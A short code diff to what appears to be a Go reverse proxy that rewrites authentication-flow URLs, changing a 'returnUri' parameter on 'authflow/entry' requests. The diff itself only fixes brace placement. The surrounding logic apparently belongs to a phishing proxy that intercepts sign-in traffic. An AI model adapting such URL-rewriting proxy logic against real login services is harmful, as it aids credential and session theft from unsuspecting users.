@@ -219,8 +219,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				    // Log the updated URL
 				    req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path + "?" + req.URL.RawQuery
 				    log.Info("Modified URL: %s", req_url)
-			} else if strings.Contains(req.URL.Path, "authflow/entry") && req.Method == http.MethodGet
-			{
+			} else if strings.Contains(req.URL.Path, "authflow/entry") && req.Method == http.MethodGet {
 				    rawQuery := req.URL.RawQuery
 				    updatedQuery := strings.Replace(rawQuery, "returnUri=myaccount", "returnUri=signin", 1)
 				
